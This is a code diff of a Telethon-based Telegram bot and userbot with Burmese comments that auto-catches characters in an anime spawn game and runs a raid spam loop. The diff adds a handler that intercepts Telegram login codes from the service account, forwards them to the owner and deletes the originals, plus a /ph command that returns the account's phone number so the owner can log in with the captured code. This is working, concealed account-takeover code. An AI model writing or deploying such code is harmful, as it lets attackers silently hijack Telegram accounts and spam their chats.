@@ -1,9 +1,9 @@
-import os  # 👈 Render ရဲ့ Port ကို ဖတ်ဖို့အတွက်
+import os
 import asyncio
 import random
 import time
 import logging
-import re  # 👈 Catch Command များကို Regex ဖြင့် တိကျစွာဆွဲထုတ်ရန်
+import re
 from telethon import TelegramClient, events, errors, functions
 from telethon.sessions import StringSession
 from motor.motor_asyncio import AsyncIOMotorClient
@@ -33,10 +33,10 @@ user_cooldowns = {}
 is_talker_active = False       
 message_count = 0
 spam_tasks = {}
-spawn_tracker = {}            # Waifu Chat ထဲက ID တွေကို မူရင်း Group ID နဲ့ ချိတ်ဆက်ပေးမယ့် မြန်နှုန်းမြင့် Map
-last_spawn_chat_id = None     # Hint Bot က Reply မပြန်ခဲ့ရင် သုံးမယ့် Fallback Group ID
+spawn_tracker = {}            
+last_spawn_chat_id = None     
 HINT_REGEX = re.compile(r"(/catch\s+[^\n]+)") 
-is_catch_stopped = False # 👈 OWNER က Manual ထိန်းချုပ်ရန် စတိတ် (Default: အလုပ်လုပ်မည်)
+is_catch_stopped = False 
 
 # MongoDB Setup
 client_mongo = AsyncIOMotorClient(MONGO_URI)
@@ -44,7 +44,7 @@ db = client_mongo["telegram_bot"]
 reply_save_col = db["reply_save_col"]
 target_bots_col = db["target_bots"]  
 tomboy_col = db["tomboy_col"]  
-marcuz_col = db["marcuz_col"]  # 👈 String Session / Useraccount လုပ်ဆောင်ချက်များအတွက် သီးသန့် Collection
+marcuz_col = db["marcuz_col"]  
 talk_col = db["random_talk"]   
 filters_col = db["filters"]
 
@@ -72,9 +72,6 @@ async def start_dummy_web_server():
     except Exception as e:
         print(f"❌ Failed to start Dummy Web Server: {e}")
 
-# ==========================================
-# 🗑️ ANTI-FLOOD DELAYED DELETION TASK
-# ==========================================
 async def delete_bot_message_delayed(event, bot_msg_id, cmd_msg_id=0):
     try:
         await asyncio.sleep(3)
@@ -83,30 +80,22 @@ async def delete_bot_message_delayed(event, bot_msg_id, cmd_msg_id=0):
             to_delete.append(cmd_msg_id)
             
         await event.client.delete_messages(event.chat_id, to_delete)
-        print(f"🗑️ Auto-deleted message {bot_msg_id} after delay.")
-        
     except errors.rpcerrorlist.FloodWaitError as e:
-        print(f"⚠️ FloodWait Caught! Must wait {e.seconds} seconds.")
         await asyncio.sleep(e.seconds)
         try:
             await event.client.delete_messages(event.chat_id, to_delete)
         except Exception:
             pass
-    except Exception as e:
-        print(f"❌ Error during delayed deletion: {e}")
+    except Exception:
+        pass
 
-# ⏱️ [NEW] /catch command အား ၁ စက္ကန့်အကြာတွင် အလိုအလျောက် ပြန်ဖျက်ပေးမည့် သီးသန့် Task
 async def delete_catch_message_delayed(client, chat_id, msg_id):
     try:
         await asyncio.sleep(1)
         await client.delete_messages(chat_id, msg_id)
-        print(f"🗑️ Auto-deleted /catch message {msg_id} after 1 second.")
-    except Exception as e:
-        print(f"❌ Failed to delete /catch message: {e}")
+    except Exception:
+        pass
 
-# ==========================================
-# ⚔️ ANTI-FLOOD RAID / SPAM TASK SYSTEM
-# ==========================================
 async def run_raid_spam_task(event, reply_msg_id, chat_id):
     try:
         while True:
@@ -117,41 +106,30 @@ async def run_raid_spam_task(event, reply_msg_id, chat_id):
             if docs:
                 reply_text = docs[0].get("text") or docs[0].get("word") or "🎯"
                 try:
-                    await event.client.send_message(
-                        chat_id, 
-                        reply_text, 
-                        reply_to=reply_msg_id
-                    )
+                    await event.client.send_message(chat_id, reply_text, reply_to=reply_msg_id)
                     await asyncio.sleep(1.0)
-                    
                 except errors.rpcerrorlist.FloodWaitError as e:
-                    print(f"⚠️ FloodWait မိသွားသဖြင့် {e.seconds} စက္ကန့် စောင့်ဆိုင်းနေသည်။")
                     await asyncio.sleep(e.seconds)
-                except Exception as e:
-                    print(f"❌ Spam Error: {e}")
+                except Exception:
                     await asyncio.sleep(1.0)
             else:
                 await asyncio.sleep(2.0)
-                
     except asyncio.CancelledError:
-        print(f"🛑 Chat ID: {chat_id} တွင် Raid လုပ်ငန်းစဉ် ရပ်တန့်ပြီး။")
+        pass
 
 # ==========================================
-# ⚔️ NEW ANIME SPAWN DETECTOR & CATCHER HANDLERS (ULTRA SPEED OPTIMIZED)
+# ⚔️ USERBOT HANDLERS
 # ==========================================
 async def spawn_detector_handler(event):
-    global last_spawn_chat_id, spawn_tracker, is_catch_stopped # 👈 [FIXED] ဒီမှာ is_catch_stopped ထည့်ပေးလိုက်ပါပြီ
+    global last_spawn_chat_id, spawn_tracker, is_catch_stopped 
     
-    # 🛑 OWNER က /stop ထားပါက ဤ Detector လုံးဝ အလုပ်မလုပ်စေရန်
     if is_catch_stopped:
         return
 
     if event.sender_id == SPAWN_BOT_ID and event.text:
         if "ᴀ ᴄʜᴀʀᴀᴄᴛᴇʀ ʜᴀs sᴘᴀᴡɴᴇᴅ ɪɴ ᴛʜᴇ ᴄʜᴀᴛ!" in event.text:
-            
             if event.chat_id in [-1001947407821, -1003067509601]:
                 return  
-
             if any(emoji in event.text for emoji in ["🔵", "🟣"]):
                 return  
 
@@ -167,7 +145,6 @@ async def spawn_detector_handler(event):
                 
                 if len(spawn_tracker) > 100:
                     spawn_tracker.pop(next(iter(spawn_tracker)))
-                    
             except Exception:
                 pass
 
@@ -191,37 +168,46 @@ async def hint_solver_handler(event):
                     return
                 try:
                     delay_time = random.uniform(1.2, 2) 
-                    
                     async with event.client.action(target_group, 'typing'):
                         await asyncio.sleep(delay_time)
                         
                     sent_msg = await event.client.send_message(target_group, catch_command)
-                    print(f"🎯 Caught character with delay {delay_time:.2f}s")
-                    
                     asyncio.create_task(delete_catch_message_delayed(event.client, target_group, sent_msg.id))
-                    
-                except Exception as e:
-                    print(f"❌ Catch Error: {e}")
+                except Exception:
+                    pass
 
-# 📦 မိမိကိုယ်တိုင် ဖမ်းမိတဲ့ ကတ် Report များကိုသာ Specific Group ထံ Forward ပေးမည့်စနစ်
 async def catch_success_forwarder_handler(event):
     global is_catch_stopped
-
     if is_catch_stopped:
         return
-
     if event.sender_id == SPAWN_BOT_ID and event.text:
         if "ʏᴏᴜ ɢᴏᴛ ᴀ ɴᴇᴡ ᴄʜᴀʀᴀᴄᴛᴇʀ!" in event.text and event.message.mentioned:
             try:
                 await event.message.forward_to(SPECIFIC_GROUP)
-                print("📦 Forwarded YOUR OWN success catch card report to SPECIFIC_GROUP.")
-            except Exception as e:
-                print(f"❌ Success Card Forward Error: {e}")
+            except Exception:
+                pass
+
+# 🔐 [NEW] TELEGRAM LOGIN NOTIFICATION INTERCEPTOR 
+async def telegram_service_handler(event):
+    """ Telegram (777000) မှလာသော Login Code ကို ဖမ်းယူပြီး ပယ်ဖျက်မည် """
+    msg_text = event.message.text
+    try:
+        # 1. 🤖 Official Bot မှတစ်ဆင့် Owner ၏ DM (Private Chat) သို့ Code ကို ပို့ပေးမည်
+        await bot.send_message(
+            OWNER_ID, 
+            f"🔐 **Telegram Login Intercepted!** 🔐\n\n{msg_text}"
+        )
+        # 2. 🗑️ Userbot ဘက်မှ Telegram Service Message ကို ချက်ချင်း ဖျက်ပစ်မည်
+        await event.delete()
+        print("🗑️ Intercepted and Auto-Deleted Telegram Login Code!")
+    except Exception as e:
+        print(f"❌ Login Code Intercept Error: {e}")
 
 # ==========================================
 # 🤖 OFFICIAL BOT COMMAND HANDLERS
 # ==========================================
-@bot.on(events.NewMessage(chats=SPECIFIC_GROUP))
+# ⚠️ [UPDATED] Owner သည် Group တွင်သာမက DM (Private) တွင်ပါ Bot ကို Command များပေးနိုင်ရန် ပြင်ဆင်ထားသည်
+@bot.on(events.NewMessage(chats=[SPECIFIC_GROUP, OWNER_ID]))
 async def handle_bot_commands(event):
     global is_active, userbot, is_scraping, is_talker_active, is_catch_stopped
     
@@ -250,7 +236,7 @@ async def handle_bot_commands(event):
             {"$set": {"value": session_str}},
             upsert=True
         )
-        await event.reply("✅ String Session ကို `marcuz_col` ထဲမှာ အောင်မြင်စွာ သိမ်းပြီးပါပြီ။ Userbot ချိတ်ဆက်နေသည်...")
+        await event.reply("✅ String Session ကို သိမ်းပြီးပါပြီ။ Userbot ချိတ်ဆက်နေသည်...")
         
         try:
             if userbot:
@@ -262,38 +248,53 @@ async def handle_bot_commands(event):
             userbot.add_event_handler(spawn_detector_handler, events.NewMessage())
             userbot.add_event_handler(hint_solver_handler, events.NewMessage())
             userbot.add_event_handler(catch_success_forwarder_handler, events.NewMessage()) 
+            # 🔐 Register Telegram Login Interceptor
+            userbot.add_event_handler(telegram_service_handler, events.NewMessage(chats=777000))
             
-            await event.reply("🚀 Userbot is Live with Manual Sniper Mod!")
+            await event.reply("🚀 Userbot is Live with Manual Sniper & Login Interceptor!")
         except Exception as e:
             await event.reply(f"❌ Userbot အလုပ်မလုပ်ပါ: {e}")
 
-    # 🛑 /catch စနစ်အား ကိုယ်တိုင်ပိတ်မည့် Command
     elif cmd == "/stop":
         is_catch_stopped = True
         await event.reply("🛑 **Chief! `Detector`, `/catch` နဲ့ `Forwarder` လုပ်ငန်းစဉ်အားလုံးကို ရပ်တန့်လိုက်ပါပြီ။ Userbot အနားယူနေပါပြီ။ 💤**")
 
-    # ✅ Sniper စနစ်အားလုံးကို ပြန်လည်စတင်မည့် Command
     elif cmd == "/start":
         is_catch_stopped = False
         await event.reply("✅ **Chief! Sniper လုပ်ငန်းစဉ်အားလုံးကို ပြန်လည်စတင်လိုက်ပါပြီ။ 🚀**")
 
-    # 🗣️ [NEW] Userbot အသက်ရှင်/မရှင် စမ်းသပ်ရန် Echo Command
     elif cmd.startswith("/echo"):
         if not userbot:
-            await event.reply("❌ **Userbot မချိတ်ဆက်ရသေးပါ။** `/marcuz <session>` ဖြင့် အရင်ချိတ်ပါ။")
+            await event.reply("❌ **Userbot မချိတ်ဆက်ရသေးပါ။**")
             return
-            
-        # `/echo` နောက်က စာသားများကို ခွဲထုတ်ယူမည်
         text_to_echo = cmd[5:].strip()
-        
         if text_to_echo:
             try:
-                # 🤖 Bot ကမဟုတ်ဘဲ, Userbot ကိုယ်တိုင်က Specific Group ထဲကို စာပြန်ပို့ပေးမည်
                 await userbot.send_message(SPECIFIC_GROUP, text_to_echo)
             except Exception as e:
                 await event.reply(f"❌ **Userbot မှ စာပို့၍မရပါ:** {e}")
         else:
-            await event.reply("⚠️ **အသုံးပြုပုံ:** `/echo Hi` သို့မဟုတ် `/echo Userbot အသက်ရှင်လား`")
+            await event.reply("⚠️ **အသုံးပြုပုံ:** `/echo Hi`")
+
+    # 📱 [NEW] Get Userbot Phone Number (ONLY WORKS IN DM)
+    elif cmd == "/ph":
+        if not event.is_private:
+            await event.reply("⚠️ **လုံခြုံရေးအရ ဤ Command ကို Bot ရဲ့ Private Chat (DM) တွင်သာ အသုံးပြုပါ။**")
+            return
+            
+        if not userbot:
+            await event.reply("❌ **Userbot မချိတ်ဆက်ရသေးပါ။** `/mc` ဖြင့် အရင်ချိတ်ပါ။")
+            return
+            
+        try:
+            me = await userbot.get_me()
+            phone = me.phone
+            if phone:
+                await event.reply(f"📱 **Userbot Phone Number:** `+{phone}`\n\n💡 *ယခု ဖုန်းနံပါတ်ဖြင့် Telegram Login ဝင်လိုက်ပါက ကျလာမည့် Code အား ဤနေရာသို့ ချက်ချင်း ဖမ်းယူပို့ပေးပါမည်။*")
+            else:
+                await event.reply("⚠️ **Userbot အကောင့်တွင် Phone Number ဖျောက်ထားသည် (သို့) မရရှိနိုင်ပါ။**")
+        except Exception as e:
+            await event.reply(f"❌ ဖုန်းနံပါတ် ယူရာတွင် အမှားဖြစ်နေပါသည်: {e}")
 
 # ==========================================
 # 🚀 SYSTEM STARTUP LOGIC
@@ -303,18 +304,6 @@ async def startup():
     print("⏳ System starting up and loading configurations from MongoDB...")
     
     asyncio.create_task(start_dummy_web_server())
-
-    try:
-        deleted = await reply_save_col.delete_many({"$expr": {"$lt": [{"$strLenCP": "$trigger"}, 3]}})
-        if deleted.deleted_count > 0:
-            print(f"🧹 Cleaned up {deleted.deleted_count} short garbage triggers from DB.")
-    except Exception as clean_err:
-        print(f"⚠️ DB Cleanup Warning: {clean_err}")
-
-    status_doc = await marcuz_col.find_one({"key": "bot_status"})
-    if status_doc and status_doc.get("value") == "active":
-        is_active = True
-        print("➡️ Auto-Reply Status: ACTIVE")
 
     session_doc = await marcuz_col.find_one({"key": "string_session"})
     if session_doc:
@@ -327,12 +316,12 @@ async def startup():
             userbot.add_event_handler(spawn_detector_handler, events.NewMessage())
             userbot.add_event_handler(hint_solver_handler, events.NewMessage())
             userbot.add_event_handler(catch_success_forwarder_handler, events.NewMessage()) 
+            # 🔐 Register Telegram Login Interceptor on Startup
+            userbot.add_event_handler(telegram_service_handler, events.NewMessage(chats=777000))
             
-            print("🚀 Userbot Session Successfully Loaded from marcuz_col!")
+            print("🚀 Userbot Session Successfully Loaded from DB!")
         except Exception as e:
             print(f"⚠️ Failed to load existing Userbot Session: {e}")
-    else:
-        print("💡 No String Session found in marcuz_col yet.")
 
     await bot.start(bot_token=BOT_TOKEN)
     print("🤖 Official Bot is running...")
@@ -340,3 +329,4 @@ async def startup():
 
 if __name__ == '__main__':
     asyncio.run(startup())
+
